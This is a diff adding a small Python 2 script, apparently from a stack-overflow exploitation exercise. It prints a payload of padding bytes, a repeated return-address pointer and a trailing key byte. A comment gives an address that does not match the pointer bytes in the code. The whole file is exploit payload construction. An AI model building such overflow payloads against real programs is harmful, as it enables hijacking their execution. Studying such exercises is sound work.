@@ -1,0 +1,11 @@
+#!/usr/bin/env python
+
+shell_pointer= "\xba\xdf\xdf\x9f\xba\xdf\xdf\x9f\xba\xdf\xdf\x9f\xba\xdf\xdf\x9f"
+key ="\x38"
+a = "A"*16
+b = "B"*32
+buf = a + shell_pointer + b + key
+
+print buf
+# 0x bf ff ff 9a
+# \xba\xdf\xdf\x9f
